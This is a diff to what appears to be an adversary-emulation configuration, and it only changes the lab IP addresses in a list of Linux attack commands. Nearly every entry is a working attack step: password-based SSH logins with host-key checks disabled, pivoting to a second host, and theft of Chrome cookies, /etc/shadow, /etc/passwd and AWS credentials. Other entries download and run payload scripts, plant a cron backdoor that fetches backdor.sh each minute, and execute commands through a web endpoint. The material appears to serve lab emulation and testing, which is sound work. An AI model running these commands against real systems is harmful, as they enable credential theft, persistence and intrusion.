@@ -10,7 +10,7 @@
       {
         "name": "sh",
         "platform": "linux",
-        "command": "curl -s --noproxy '*' http://172.21.0.20 -o /dev/null; sshpass -p 'Passw0rd' ssh -o StrictHostKeyChecking=no attacker@172.21.0.20 'cat /home/attacker/.config/google-chrome/Default/Cookies'"
+        "command": "curl -s --noproxy '*' http://192.168.20.30 -o /dev/null; sshpass -p 'Passw0rd' ssh -o StrictHostKeyChecking=no attacker@192.168.20.30 'cat /home/attacker/.config/google-chrome/Default/Cookies'"
       }
     ]
   },
@@ -25,7 +25,7 @@
       {
         "name": "sh",
         "platform": "linux",
-        "command": "smbclient //172.21.0.20/share -U DebianUser%DebianUser -c 'dir' && smbclient //172.21.0.20/share -U DebianUser%DebianUser -c 'get fake_service.sh'"
+        "command": "smbclient //192.168.20.30/share -U DebianUser%DebianUser -c 'dir' && smbclient //192.168.20.30/share -U DebianUser%DebianUser -c 'get fake_service.sh'"
       }
     ]
   },
@@ -40,7 +40,7 @@
       {
         "name": "sh",
         "platform": "linux",
-        "command": "smbclient //172.21.0.20/share -U root%P@ssw0rd -c 'ls'"
+        "command": "smbclient //192.168.20.30/share -U root%P@ssw0rd -c 'ls'"
       }
     ]
   },
@@ -55,7 +55,7 @@
       {
         "name": "sh",
         "platform": "linux",
-        "command": "sshpass -p 'Passw0rd' ssh -o StrictHostKeyChecking=no attacker@172.21.0.20 'curl -s http://172.21.0.20/malicious.sh | cat'"
+        "command": "sshpass -p 'Passw0rd' ssh -o StrictHostKeyChecking=no attacker@192.168.20.30 'curl -s http://192.168.20.30/malicious.sh | cat'"
       }
     ]
   },
@@ -70,7 +70,7 @@
       {
         "name": "sh",
         "platform": "linux",
-        "command": "curl --proxy http://172.21.0.20:8888 http://172.22.0.20"
+        "command": "curl --proxy http://192.168.20.30:8888 http://192.168.30.40"
       }
     ]
   },
@@ -85,7 +85,7 @@
       {
         "name": "sh",
         "platform": "linux",
-        "command": "sshpass -p 'RootPass123' ssh -o StrictHostKeyChecking=no root@172.21.0.20 'echo \"ls -la\" | socat - UNIX-CONNECT:/tmp/mysocket'"
+        "command": "sshpass -p 'RootPass123' ssh -o StrictHostKeyChecking=no root@192.168.20.30 'echo \"ls -la\" | socat - UNIX-CONNECT:/tmp/mysocket'"
       }
     ]
   },
@@ -100,7 +100,7 @@
       {
         "name": "sh",
         "platform": "linux",
-        "command": "curl -X POST -F 'cmd=whoami' http://172.21.0.20:5055/exec"
+        "command": "curl -X POST -F 'cmd=whoami' http://192.168.20.30:5055/exec"
       }
     ]
   },
@@ -115,7 +115,7 @@
       {
         "name": "sh",
         "platform": "linux",
-        "command": "sshpass -p 'RootPass123' ssh -o StrictHostKeyChecking=no root@172.21.0.20 id; sshpass -p 'RootPass123' ssh -o StrictHostKeyChecking=no root@172.21.0.20 'cat /etc/shadow' > /tmp/shadow_hosta.txt; sshpass -p 'RootPass123' ssh -o StrictHostKeyChecking=no root@172.21.0.20 'sshpass -p \"RootPass123\" ssh -o StrictHostKeyChecking=no root@172.22.0.20 id'"
+        "command": "sshpass -p 'RootPass123' ssh -o StrictHostKeyChecking=no root@192.168.20.30 id; sshpass -p 'RootPass123' ssh -o StrictHostKeyChecking=no root@192.168.20.30 'cat /etc/shadow' > /tmp/shadow_hosta.txt; sshpass -p 'RootPass123' ssh -o StrictHostKeyChecking=no root@192.168.20.30 'sshpass -p \"RootPass123\" ssh -o StrictHostKeyChecking=no root@192.168.30.40 id'"
       }
     ]
   },
@@ -130,7 +130,7 @@
       {
         "name": "sh",
         "platform": "linux",
-        "command": "curl -X POST -F 'cmd=id' http://172.21.0.20:5055/exec"
+        "command": "curl -X POST -F 'cmd=id' http://192.168.20.30:5055/exec"
       }
     ]
   },
@@ -145,7 +145,7 @@
       {
         "name": "sh",
         "platform": "linux",
-        "command": "sshpass -p RootPass123 ssh -o StrictHostKeyChecking=no root@172.21.0.20 'id && cat /etc/passwd' && sshpass -p RootPass123 ssh -o StrictHostKeyChecking=no root@172.21.0.20 'sshpass -p RootPass123 ssh -o StrictHostKeyChecking=no root@172.22.0.20 id'"
+        "command": "sshpass -p RootPass123 ssh -o StrictHostKeyChecking=no root@192.168.20.30 'id && cat /etc/passwd' && sshpass -p RootPass123 ssh -o StrictHostKeyChecking=no root@192.168.20.30 'sshpass -p RootPass123 ssh -o StrictHostKeyChecking=no root@192.168.30.40 id'"
       }
     ]
   },
@@ -160,7 +160,7 @@
       {
         "name": "sh",
         "platform": "linux",
-        "command": "sshpass -p RootPass123 ssh -o StrictHostKeyChecking=no root@172.21.0.20 'chmod +x /tmp/payload.sh && /tmp/payload.sh'"
+        "command": "sshpass -p RootPass123 ssh -o StrictHostKeyChecking=no root@192.168.20.30 'chmod +x /tmp/payload.sh && /tmp/payload.sh'"
       }
     ]
   },
@@ -175,7 +175,7 @@
       {
         "name": "sh",
         "platform": "linux",
-        "command": "curl --proxy http://172.21.0.20:8888 http://172.22.0.20"
+        "command": "curl --proxy http://192.168.20.30:8888 http://192.168.30.40"
       }
     ]
   },
@@ -190,7 +190,7 @@
       {
         "name": "sh",
         "platform": "linux",
-        "command": "sshpass -p 'RootPass123' ssh -o StrictHostKeyChecking=no root@172.21.0.20 'echo \"wget http://172.21.0.20/backdor.sh\" > /root/backdoor_task.sh'  && sshpass -p 'RootPass123' ssh -o StrictHostKeyChecking=no root@172.21.0.20 'echo \"* * * * * root /root/backdoor_task.sh\" > /etc/cron.d/backdoor_task && chmod 644 /etc/cron.d/backdoor_task'"
+        "command": "sshpass -p 'RootPass123' ssh -o StrictHostKeyChecking=no root@192.168.20.30 'echo \"wget http://192.168.20.30/backdor.sh\" > /root/backdoor_task.sh'  && sshpass -p 'RootPass123' ssh -o StrictHostKeyChecking=no root@192.168.20.30 'echo \"* * * * * root /root/backdoor_task.sh\" > /etc/cron.d/backdoor_task && chmod 644 /etc/cron.d/backdoor_task'"
       }
     ]
   },
@@ -205,7 +205,7 @@
       {
         "name": "sh",
         "platform": "linux",
-        "command": "smbclient -U attacker%attacker //172.21.0.20/share -c 'ls'"
+        "command": "smbclient -U attacker%attacker //192.168.20.30/share -c 'ls'"
       }
     ]
   },
@@ -220,7 +220,7 @@
       {
         "name": "sh",
         "platform": "linux",
-        "command": "sshpass -p 'RootPass123' ssh -o StrictHostKeyChecking=no root@172.21.0.20 'cp /etc/passwd /var/www/html/'"
+        "command": "sshpass -p 'RootPass123' ssh -o StrictHostKeyChecking=no root@192.168.20.30 'cp /etc/passwd /var/www/html/'"
       }
     ]
   },
@@ -235,7 +235,7 @@
       {
         "name": "sh",
         "platform": "linux",
-        "command": "sshpass -p 'RootPass123' ssh -o StrictHostKeyChecking=no root@172.21.0.20 'sshpass -p \"RootPass123\" ssh -o StrictHostKeyChecking=no root@172.22.0.20 hostname'"
+        "command": "sshpass -p 'RootPass123' ssh -o StrictHostKeyChecking=no root@192.168.20.30 'sshpass -p \"RootPass123\" ssh -o StrictHostKeyChecking=no root@192.168.30.40 hostname'"
       }
     ]
   },
@@ -250,7 +250,7 @@
       {
         "name": "sh",
         "platform": "linux",
-        "command": "sshpass -p 'Passw0rd' ssh attacker@172.21.0.20 \"cat ~/.aws/credentials\" && echo \"aws s3 ls not available on lab!\""
+        "command": "sshpass -p 'Passw0rd' ssh attacker@192.168.20.30 \"cat ~/.aws/credentials\" && echo \"aws s3 ls not available on lab!\""
       }
     ]
   },
